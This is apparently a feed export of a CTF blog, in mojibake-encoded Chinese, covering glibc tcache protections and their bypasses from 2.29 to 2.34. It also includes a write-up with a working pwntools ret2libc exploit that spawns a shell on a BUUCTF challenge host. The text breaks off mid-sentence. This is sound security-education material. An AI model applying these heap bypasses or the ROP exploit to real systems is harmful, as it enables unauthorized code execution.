class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><h4 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a><strong>tcache_perthread_struct</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> counts[TCACHE_MAX_BINS]; <br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_MAX_BINS                64</span><br><br><span class="hljs-keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><ul><li><code>tcache_prethread_struct</code> æ˜¯æ•´ä¸ª tcache çš„ç®¡ç†ç»“æ„ï¼Œå…¶ä¸­æœ‰ 64 é¡¹ entriesã€‚æ¯ä¸ª entries ç®¡ç†äº†è‹¥å¹²ä¸ªå¤§å°ç›¸åŒçš„ chunkï¼Œç”¨å•å‘é“¾è¡¨ (<code>tcache_entry</code>) çš„æ–¹å¼è¿æ¥é‡Šæ”¾çš„ chunkï¼Œè¿™ä¸€ç‚¹ä¸Šå’Œ fastbin å¾ˆåƒ</li><li>æ¯ä¸ª thread éƒ½ä¼šç»´æŠ¤ä¸€ä¸ª <code>tcache_prethread_struct</code></li><li><code>tcache_prethread_struct</code> ä¸­çš„ <code>counts</code> è®°å½• <code>entries</code> ä¸­æ¯ä¸€æ¡é“¾ä¸Š chunk çš„æ•°ç›®ï¼Œæ¯æ¡é“¾ä¸Šæœ€å¤šå¯ä»¥æœ‰ 7 ä¸ª chunk</li><li>tcache_entryç”¨äºé“¾æ¥ chunk ç»“æ„ä½“ï¼Œå…¶ä¸­çš„nextæŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªå¤§å°ç›¸åŒçš„ chunk<ul><li>è¿™é‡Œä¸ fastbin ä¸åŒçš„æ˜¯ fastbin çš„ fd æŒ‡å‘ chunk å¼€å¤´çš„åœ°å€ï¼Œè€Œ tcache çš„ next æŒ‡å‘ user data çš„åœ°æ–¹ï¼Œå³ chunk header ä¹‹å</li></ul></li></ul><p>ç®€å•æ¥è¯´ï¼šå°±æ˜¯ç±»ä¼¼fastbinä¸€æ ·çš„ä¸œè¥¿ï¼Œæ¯æ¡é“¾ä¸Šæœ€å¤šå¯ä»¥æœ‰ 7 ä¸ª chunkï¼Œfreeå †å—çš„æ—¶å€™ä¼˜å…ˆæ”¾å…¥tcacheä¸­ï¼Œæ»¡äº†æ‰æ”¾å…¥fastbinï¼Œunsorted binï¼Œmallocçš„æ—¶å€™ä¼˜å…ˆå»tcacheæ‰¾ï¼ˆtcacheçš„èŒƒå›´æ˜¯ [0x20, 0x410]ï¼Œè¶…è¿‡è¿™ä¸ªå¤§å°çš„å°±ä¼šæ”¾å…¥unsorted binï¼‰</p><p>tcache dupï¼šå› ä¸ºå‰å‡ ä¸ªç‰ˆæœ¬çš„ <code>tcache bin</code>æ˜¯ç¼ºä¹æ ¡éªŒæœºåˆ¶çš„ï¼Œå³ä½¿å¯¹<code>tcache bin chunk</code>é‡å¤é‡Šæ”¾ï¼Œä¹Ÿä¸ä¼šå¼•å‘ä»»ä½•å¼‚å¸¸ã€‚æ¯”<code>fastbin chunk</code>çš„çº¦æŸæ›´å°‘ï¼Œä¸€æ¥ä¸æ£€æŸ¥sizeåŸŸï¼ŒäºŒæ¥ä¹Ÿä¸æ£€æŸ¥æ˜¯å¦é‡å¤é‡Šæ”¾</p><p><code>tcache_perthread_struct</code>è¿™ä¸ªç»“æ„ä½“æ˜¯å¯ä»¥é‡Šæ”¾çš„ï¼Œå¹¶ä¸”å¯ä»¥å°†å®ƒé‡Šæ”¾åˆ°<code>unsorted bin</code>ä¸­å»ï¼ˆå‰ææ˜¯å…ˆä¿®æ”¹0x250å¤§å°å †å—çš„countä¸º7ï¼‰ï¼Œç„¶ååˆ†é…è¿™ä¸ª<code>unsorted bin chunk</code>ï¼Œå¯ä»¥æ§åˆ¶ä»»æ„åœ°å€åˆ†é…å †å†…å­˜ã€‚</p><h3 id="é«˜ç‰ˆæœ¬Tcache"><a href="#é«˜ç‰ˆæœ¬Tcache" class="headerlink" title="é«˜ç‰ˆæœ¬Tcache"></a>é«˜ç‰ˆæœ¬Tcache</h3><p>ä¸€ã€åœ¨libc-2.29.soåŠä»¥ä¸Šçš„ç‰ˆæœ¬å¾€tcacheç»“æ„ä½“æ·»åŠ äº†ä¸€ä¸ª<code>key</code>æ¥é˜²æ­¢double freeï¼Œåˆ¤æ–­æ¡ä»¶å°±æ˜¯tcache_entryçš„keyæŒ‡é’ˆï¼ˆè¢«é‡Šæ”¾å †å—çš„bkæŒ‡é’ˆä½ç½®ä¸Šå¡«å…¥tcacheçš„åœ°å€ï¼‰æ˜¯å¦ç­‰äº<strong>tcache bin</strong>çš„åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span> *<span class="hljs-title">key</span>;</span><br>&#125; tcache_entry;<br></code></pre></td></tr></table></figure><p>ç»•è¿‡ï¼šåˆ©ç”¨UAFæˆ–è€…æº¢å‡ºç­‰ç­‰ï¼Œä¿®æ”¹è¢«é‡Šæ”¾å †å—nextæŒ‡é’ˆï¼Œå“ªæ€•æ˜¯ä¸€ä¸ªå­—èŠ‚éƒ½è¡Œ</p><p>äºŒã€åœ¨<code> libc-2.32.so</code>ç‰ˆæœ¬ä¸­æ–°åŠ å…¥äº†ä¸€ä¸ª key ä¼šå¯¹ tcache next çš„å†…å®¹è¿›è¡Œå¼‚æˆ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> </span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]); <span class="hljs-comment">//ä¸æ˜¯ç›´æ¥èµ‹å€¼next</span><br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br>  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Safe-Linking:</span><br><span class="hljs-comment">Use randomness from ASLR (mmap_base) to protect single-linked lists</span><br><span class="hljs-comment">of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span><br><span class="hljs-comment">lists&#x27; chunks, and also perform allocation alignment checks on them.</span><br><span class="hljs-comment">This mechanism reduces the risk of pointer hijacking, as was done with</span><br><span class="hljs-comment">Safe-Unlinking in the double-linked lists of Small-Bins.</span><br><span class="hljs-comment">It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span><br><span class="hljs-comment">larger pages provide less entropy, although the pointer mangling</span><br><span class="hljs-comment">still works.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br></code></pre></td></tr></table></figure><p>PROTECT_PTRï¼šå¯¹ pos å³ç§»äº† 12 ä½ï¼ˆå»é™¤äº†æœ«å°¾çš„ 3 ä½ä¿¡æ¯ï¼‰ï¼Œå†å¼‚æˆ–åŸæ¥çš„æŒ‡é’ˆï¼ˆåœ¨è¿™ä¹‹å‰ next å‚¨å­˜çš„å †åœ°å€ï¼‰ã€‚</p><p>è€Œè¿™é‡Œçš„ <strong>key å°±æ˜¯å‚¨å­˜å†…å®¹çš„æŒ‡é’ˆï¼ˆåœ¨ä»£ç ä¸­å«åš posï¼‰</strong>ï¼Œåœ¨æ”¾å…¥çš„æ—¶å€™è®©å†…å®¹ä¸è¿™ä¸ª <strong>key</strong> è¿›è¡Œå¼‚æˆ–å†å‚¨å­˜ï¼Œåœ¨å–å‡ºçš„æ—¶å€™è®©å†…å®¹ä¸è¿™ä¸ª <strong>key</strong> è¿›è¡Œå¼‚æˆ–å†å–å‡ºã€‚è€Œå¾—ç›Šäºè¿™ä¸ªç§˜é’¥å°±æ˜¯å‚¨å­˜å†…å®¹çš„æŒ‡é’ˆï¼Œæ‰€ä»¥æ— éœ€ä½¿ç”¨å…¶ä»–ç©ºé—´æ¥æ”¾ç½®è¿™ä¸ª <strong>key</strong> çš„å†…å®¹ï¼Œåªéœ€è¦ä¿å­˜å¼‚æˆ–ä¹‹åçš„å†…å®¹ï¼Œåœ¨è§£å¯†æ—¶åªéœ€ <strong>PROTECT_PTR (&amp;ptr, ptr)</strong> è¿™æ ·æ“ä½œå³å¯ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“ tcache ä¸­åªæœ‰ä¸€ä¸ªå…ƒç´ çš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯åœ¨æ”¾å…¥è¿™ä¸ªå…ƒç´ çš„è¿‡ç¨‹ä¸­ï¼Œ<strong>tcache-&gt;entries[tc_idx] == 0</strong>ï¼Œåœ¨è¿™ä¸ªæ—¶å€™æ”¾å…¥å…ƒç´ çš„æ—¶å€™ä¼šå¼‚æˆ– 0ï¼Œä¹Ÿå°±æ˜¯åœ¨ <strong>e-&gt;next ä½ç½®å­˜æ”¾</strong>çš„å†…å®¹æ­£å¥½å°±æ˜¯ <strong>key çš„ä¿¡æ¯</strong>ï¼Œå› ä¸º <strong>key å¼‚æˆ– 0 è¿˜æ˜¯ç§˜é’¥</strong>ã€‚è€Œä¸”å°±ç®—ä¹‹ååŠ å…¥äº†å…¶ä»–çš„å…ƒç´ ï¼Œè¿™ä¸ªå…ƒç´ å§‹ç»ˆè¿˜æ˜¯åœ¨é“¾è¡¨çš„å°¾éƒ¨ï¼Œæ‰€ä»¥å†…å®¹ä¸ä¼šå‘ç”Ÿå˜åŒ–</p><p>ç»•è¿‡ï¼š</p><ul><li>é€šè¿‡ 0 å¼‚æˆ–ç§˜é’¥è¿˜æ˜¯ç§˜é’¥çš„è¿™ä¸ªç‰¹æ€§ï¼Œå½“ tcache é“¾ä¸Šåªæœ‰ä¸€ä¸ªæŒ‡é’ˆçš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ show å‡½æ•°æ¥ leak å‡ºç§˜é’¥çš„ä¿¡æ¯ï¼Œæœ‰äº†ç§˜é’¥çš„ä¿¡æ¯ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¼ªé€ ç§˜é’¥ä¿¡æ¯äº†</li><li>å¯ä»¥é€šè¿‡ largebin æ¥æ³„éœ²å †åœ°å€ï¼Œç”±äº key æ˜¯å½“å‰æŒ‡é’ˆ &gt;&gt; 12ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¡®ä¿åœ¨ 4096 å­—èŠ‚å†…è¿™ä¸ª key éƒ½æ˜¯æ­£ç¡®çš„</li></ul><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><h4 id="ä¸€ã€æ³„éœ²å †åŸºå€"><a href="#ä¸€ã€æ³„éœ²å †åŸºå€" class="headerlink" title="ä¸€ã€æ³„éœ²å †åŸºå€"></a>ä¸€ã€æ³„éœ²å †åŸºå€</h4><p>æ„é€ ä¸¤ä¸ªç›¸åŒ size çš„å †å— a å’Œ bï¼Œæˆ‘ä»¬å…ˆ free (a) è®©ä»–è¿›å…¥åˆ° tcache ä¸­ï¼Œå† free (b) ä¹Ÿè®©ä»–è¿›å…¥åˆ° tcache ä¸­ã€‚è¿™æ—¶å€™ï¼Œåœ¨å †å— b çš„ fd ä½ç½®å°±å­˜åœ¨ç€å †å— a çš„åœ°å€ï¼Œæˆ‘ä»¬ leak å‡ºæ¥å°±èƒ½å¤Ÿå¾—åˆ°å †åœ°å€</p><h2 id="libc-2-29-so"><a href="#libc-2-29-so" class="headerlink" title="libc-2.29.so"></a>libc-2.29.so</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ) || __glibc_unlikely (size &gt; av-&gt;system_mem)) malloc_printerr (<span class="hljs-string">&quot;malloc: invalid size (unsorted)&quot;</span>); <br><span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ) || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem)) <br>    malloc_printerr (<span class="hljs-string">&quot;malloc: invalid next size (unsorted)&quot;</span>); <br><span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size)) <br>    malloc_printerr (<span class="hljs-string">&quot;malloc: mismatching next-&gt;prev_size (unsorted)&quot;</span>); <br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim) || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av))) malloc_printerr (<span class="hljs-string">&quot;malloc: unsorted double linked list corrupted&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next))) <br>    malloc_printerr (<span class="hljs-string">&quot;malloc: invalid next-&gt;prev_inuse (unsorted)&quot;</span>); ...... ...... <span class="hljs-comment">/* remove from unsorted list */</span> <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc: corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck; <br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><ul><li><p>å¯¹äº<code>unsortbin</code>çš„è§£é“¾æ·»åŠ äº†éªŒè¯é“¾å®Œæ•´æ€§çš„æ£€æŸ¥ï¼Œè®© <code>unsortbin attack</code>å¤±æ•ˆ</p><ul><li><p>ç»•è¿‡ï¼š</p><p>1.largebinä¸­çš„chunk-&gt;fd_nextsize=0;</p><p>2.largebinä¸­çš„chunk-&gt;bk_nextsizeå¯æ§åˆ¶;</p><p>3.unsortedbiné‡Œçš„chunkå¤§äºlargebinï¼Œå¹¶ä¸”å¦‚æœè¿›å…¥largebinï¼Œæ˜¯åŒä¸€ä¸ªindexã€‚</p></li></ul></li></ul><h3 id="Tcache-Stashing-Unlink-Attack"><a href="#Tcache-Stashing-Unlink-Attack" class="headerlink" title="Tcache Stashing Unlink Attack"></a>Tcache Stashing Unlink Attack</h3><p>é«˜ç‰ˆæœ¬ä¸€æ ·å¯ç”¨ï¼Œå› ä¸ºæ˜¯å¯¹unlinkçš„ç»•è¿‡ï¼Œè‡³å°‘ç›®å‰æˆ‘çŸ¥é“çš„ï¼šåˆ°libc-2.32æ˜¯æ²¡é—®é¢˜çš„</p><h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><p>1.<code>smallbin</code>ä¸­å¯ä»¥æ§åˆ¶å¤§å°ä¸ºsizeå—çš„bkæŒ‡é’ˆ</p><p>2.<code>tcache</code>ä¸­sizeå—çš„ä¸ªæ•°ä¸º6</p><p>3.ç”³è¯·å †å—æ˜¯<code>calloc</code></p><h4 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h4><ul><li>é‡Šæ”¾6ä¸ª0x100çš„chunkåˆ°tcache binä¸­</li><li>æ„é€ ä¸¤ä¸ª0x100çš„small binï¼ˆåˆ©ç”¨Unsorted binæˆ–Large binåˆ‡å‰²å¾—åˆ°ï¼‰</li><li>ä¿®æ”¹åæ’å…¥çš„small binçš„ bk æŒ‡é’ˆä¸ºç›®æ ‡åœ°å€-0x10ï¼Œä¸”ä¿æŒfdæŒ‡é’ˆä¸å˜</li><li>ç”¨callocåˆ†é…0x100çš„chunk</li></ul><h4 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h4><ul><li>åœ¨ç›®æ ‡åœ°å€ä¸Šå†™å…¥åŸæœ¬small binä¸Šçš„ bk æŒ‡é’ˆå†…å®¹</li></ul><h2 id="libc-2-32-so"><a href="#libc-2-32-so" class="headerlink" title="libc-2.32.so"></a>libc-2.32.so</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (SINGLE_THREAD_P)  <br>&#123;<br>    <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to</span><br><span class="hljs-comment">        add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>        malloc_printerr(<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br>    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);<br>    *fb = p;<br>&#125;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        <span class="hljs-comment">/* Check that the top of the bin is not the record we are going to</span><br><span class="hljs-comment">            add (i.e., double free).  */</span><br>        <span class="hljs-keyword">if</span> (__builtin_expect(old == p, <span class="hljs-number">0</span>))<br>            malloc_printerr(<span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>);<br>        old2 = old;<br>        p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);<br>    &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2))<br>        != old2);<br></code></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯glibc2.32ä¸‹çš„fastbinæºç ï¼ŒåŒæ ·å­˜åœ¨è·Ÿtcacheä¸€æ ·çš„ä¿æŠ¤æœºåˆ¶ï¼Œä¼šå¯¹ fd æŒ‡é’ˆè¿›è¡Œå¼‚æˆ–å¤„ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br></code></pre></td></tr></table></figure><p>ç”±äºè¿™ä¸ªæ£€æµ‹çš„å­˜åœ¨ï¼Œæˆ‘ä»¬ tcache ç”³è¯·çš„åœ°å€ä¼¼ä¹è¦åšåˆ° 0x10 å¯¹é½ï¼ˆx64ï¼‰</p><h2 id="libc-2-34-so"><a href="#libc-2-34-so" class="headerlink" title="libc-2.34.so"></a>libc-2.34.so</h2><p>è¯¥ç‰ˆæœ¬åˆ é™¤äº†å„ç§ hook å‡½æ•°ï¼Œæ‰€ä»¥è¦æ›´æ¢æ€è·¯ï¼Œä¸€èˆ¬å¯ä»¥é€šè¿‡ FSOP æ”»å‡»è¾“å‡ºæµçš„å‡½æ•°è™šè¡¨</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æœ¬ç¯‡æœ¬ç« æ˜¯ä»¥libc-2.23.soä¸ºåŸºç¡€ï¼Œå»å¯¹æ¯”ä¹‹åç‰ˆæœ¬çš„å·®å¼‚é—®é¢˜&lt;/p&gt;
&lt;h2 id=&quot;libc-2-23-so&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="glibc" scheme="http://example.com/tags/glibc/"/>
    
  </entry>
  
  <entry>
    <title>buu07</title>
    <link href="http://example.com/2021/08/12/2021-08-12-buu07/"/>
    <id>http://example.com/2021/08/12/2021-08-12-buu07/</id>
    <published>2021-08-12T10:56:31.000Z</published>
    <updated>2021-10-13T08:01:22.863Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä¸€ã€xdctf2015-pwn200"><a href="#ä¸€ã€xdctf2015-pwn200" class="headerlink" title="ä¸€ã€xdctf2015_pwn200"></a>ä¸€ã€xdctf2015_pwn200</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210812185855607.png" alt="image-20210812185855607"></p><p>checksecä¸€ä¸‹ï¼Œ32ä½ï¼Œå¼€äº†nx</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210812192549644.png" alt="image-20210812192549644"></p><p>ç¨‹åºå¾ˆç®€å•ï¼Œè¿™è¾¹æœ‰ä¸ªå¾ˆæ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œå¹¶ä¸”ç¨‹åºå«æœ‰æ³„éœ²å‡½æ•°writeï¼Œæ„é€ åŸºç¡€çš„ropå°±è¡Œäº†</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210812192512692.png" alt="image-20210812192512692"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25644</span>)<br><span class="hljs-comment">#p=process(&#x27;./bof&#x27;)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./bof&#x27;</span>)<br>main=<span class="hljs-number">0x80484d6</span><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.recvline()<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>p.sendline(payload)<br>write=u32(p.recv(<span class="hljs-number">4</span>))<br>log.info(<span class="hljs-string">&quot;write addr:&quot;</span>+<span class="hljs-built_in">hex</span>(write))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(system)+p32(main)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="äºŒã€jarvisoj-level6-x64"><a href="#äºŒã€jarvisoj-level6-x64" class="headerlink" title="äºŒã€jarvisoj_level6_x64"></a>äºŒã€jarvisoj_level6_x64</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210812200521406.png" alt="image-20210812200521406"></p><p>çœ‹é™„ä»¶åå­—ï¼Œåº”è¯¥æ˜¯é“å †é¢˜ï¼Œè¿™é“å †é¢˜æ²¡å¼€PIEï¼ŒRELROæ²¡å¼€å…¨ï¼Œè¿™ç§é¢˜ç›®ä¸€èˆ¬æ˜¯æƒ³åŠæ³•ä¿®æ”¹gotè¡¨ï¼Œè¿™æ ·èƒ½ç¨³å®šgetshell</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200255661.png" alt="image-20210914200255661"></p><p>é¦–å…ˆï¼Œåˆ›å»ºäº†ä¸€ä¸ªå¤§å †å—ï¼Œç”¨æ¥ä¿å­˜åé¢ç”³è¯·å †å—çš„sizeï¼ŒæŒ‡é’ˆç­‰ä¿¡æ¯</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200621734.png" alt="image-20210914200621734"></p><p>åœ¨ç”³è¯·å †å—åŠŸèƒ½é‡Œçš„è¿™ä¸ªè¯­å¥ä»£è¡¨åˆ†é…å †å—çš„å¤§å°æ˜¯0x80çš„æ•´æ•°å€</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210914200526193-16316211508721.png" alt="image-20210914200526193"></p><p>åœ¨editåŠŸèƒ½ä¸­ï¼Œå¦‚æœä½ 